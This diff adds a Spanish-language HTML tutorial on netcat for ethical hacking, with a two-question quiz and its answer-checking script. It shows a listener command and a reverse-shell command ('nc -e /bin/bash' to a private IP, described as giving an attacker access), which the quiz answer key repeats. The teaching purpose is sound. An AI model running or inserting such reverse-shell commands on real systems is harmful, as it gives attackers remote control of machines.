@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial de Netcat</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        h1, h2 {
+            color: #4CAF50;
+        }
+        code {
+            background-color: #eee;
+            padding: 2px 4px;
+            font-family: "Courier New", Courier, monospace;
+            display: block;
+            margin: 10px 0;
+        }
+        #quiz {
+            margin-top: 20px;
+        }
+        .question {
+            margin: 15px 0;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #result {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Tutorial de Netcat</h1>
+    <p>En este tutorial aprenderás a usar el comando <strong>netcat</strong>, una herramienta versátil para el diagnóstico de redes y hacking ético. A continuación, cubrimos los aspectos básicos.</p>
+
+    <h2>¿Qué es Netcat?</h2>
+    <p>Netcat es una herramienta de red que puede leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP. Se usa para propósitos como el escaneo de puertos, la transferencia de archivos, y el establecimiento de conexiones reversas.</p>
+
+    <h2>Abrir Puertos</h2>
+    <p>Para abrir un puerto con netcat, puedes usar el siguiente comando:</p>
+    <code>nc -l -p 1234</code>
+    <p>Esto abrirá el puerto <strong>1234</strong> en modo de escucha. Cualquier conexión a este puerto será aceptada.</p>
+
+    <h2>Reverse Shell</h2>
+    <p>Una reverse shell permite a un atacante obtener acceso a un sistema remoto. Aquí un ejemplo usando netcat:</p>
+    <code>nc -e /bin/bash 192.168.1.100 4444</code>
+    <p>Este comando ejecuta <strong>/bin/bash</strong> en la máquina remota y envía la salida al atacante que escucha en la IP <strong>192.168.1.100</strong> en el puerto <strong>4444</strong>.</p>
+
+    <h2>Situaciones de Uso</h2>
+    <p>Netcat se usa en situaciones como:</p>
+    <ul>
+        <li>Diagnóstico de redes</li>
+        <li>Transferencia de archivos entre sistemas</li>
+        <li>Auditorías de seguridad</li>
+        <li>Pruebas de penetración para evaluar la seguridad</li>
+    </ul>
+
+    <div id="quiz">
+        <h2>Examen Final: Hacking Ético</h2>
+        <div class="question">
+            <p><strong>1. ¿Qué comando usas para abrir un puerto en modo escucha con netcat?</strong></p>
+            <input type="text" id="q1">
+        </div>
+        <div class="question">
+            <p><strong>2. ¿Cómo iniciarías una reverse shell hacia la IP 10.0.0.1 y el puerto 4444?</strong></p>
+            <input type="text" id="q2">
+        </div>
+        <button onclick="checkAnswers()">Enviar respuestas</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function checkAnswers() {
+            const q1 = document.getElementById('q1').value.trim();
+            const q2 = document.getElementById('q2').value.trim();
+            let score = 0;
+
+            if (q1 === 'nc -l -p 1234') {
+                score++;
+            }
+
+            if (q2 === 'nc -e /bin/bash 10.0.0.1 4444') {
+                score++;
+            }
+
+            document.getElementById('result').innerText = `Obtuviste ${score} de 2 respuestas correctas.`;
+        }
+    </script>
+
+</body>
+</html>
